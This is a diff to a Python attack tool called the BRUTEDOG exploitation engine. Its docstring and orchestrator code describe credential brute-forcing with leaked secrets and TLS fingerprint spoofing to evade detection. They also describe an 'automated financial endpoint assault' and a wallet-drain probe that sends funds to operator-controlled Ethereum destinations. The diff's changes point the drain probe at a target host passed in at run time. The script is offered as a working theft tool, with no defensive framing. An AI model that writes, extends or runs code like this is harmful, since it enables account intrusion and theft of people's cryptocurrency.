@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v7.3 — State-Machine Logic & High-Aggression Exploitation Engine
+BRUTEDOG ENGINE v7.4 — State-Machine Logic & High-Aggression Exploitation Engine
 Features:
 - Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter)
 - Integrated with BruteDog Scanner V2.0 for asynchronous TCP recon, service ID, and TLS/security header auditing
@@ -10,7 +10,7 @@ Features:
 - Persistent Session Pool & Response Fingerprinter integration for false-positive elimination
 - HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
 - Active Multi-Chain Liquidity Auditor & Transaction Signer/Broadcaster integration
-- Automated Wallet Drain Probe Integration using operator destinations from drainer.py
+- Automated Wallet Drain Probe Integration using operator destinations & dynamic target ingestion
 - Automated Referral Validation Gateway Fuzzing Integration (test_referral.py)
 - Zero-disk in-memory intelligence collection & live telemetry streaming
 """
@@ -295,7 +295,7 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
 # ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
-    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v7.3")
+    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v7.4")
     try:
         if target_host:
             target_url = target_host.strip()
@@ -336,7 +336,6 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
             open_port_list = scan_results.get("open_ports", [])
             success(f"Scanner V2.0 completed. Found {len(open_port_list)} open ports.")
             
-            # Log security header gaps discovered by Scanner V2.0
             for p in open_port_list:
                 missing_hdrs = p.get("details", {}).get("http", {}).get("missing_security_headers", [])
                 if missing_hdrs:
@@ -377,7 +376,6 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     if not discovered_paths:
         discovered_paths = FALLBACK_LOGIN_PATHS
 
-    # Bulletproof Type-Agnostic Cookie Synchronization (Eliminates 'str' object has no attribute 'domain')
     active_cookies = session_cookie_payload if session_cookie_payload else getattr(transport, "cookie_jar", None)
     if active_cookies:
         success("Propagating active operator session cookie across transport layer safely.")
@@ -478,13 +476,14 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     try:
         await run_drainer_engine(target_url)
         
-        # Execute automated financial endpoint assault using operator wallet destination
+        # Execute automated financial endpoint assault using operator wallet destination and dynamic target host
         operator_evm_dest = OPERATOR_DESTINATIONS.get("ETHEREUM")
-        info(f"[*] Dispatching Wallet Drain Probe with operator destination: {operator_evm_dest}")
+        info(f"[*] Dispatching Wallet Drain Probe on {target_url} with operator destination: {operator_evm_dest}")
         
         session_cookies_dict = dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else {}
         await asyncio.to_thread(
             execute_probe, 
+            target_host=target_url,
             session_cookies=session_cookies_dict, 
             target_wallet=operator_evm_dest
         )
@@ -511,4 +510,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         warning("Engine interrupted by operator.")
     except Exception as exc:
-        error(f"Engine failure: {exc}")
+        error(f"Fatal engine error: {exc}")
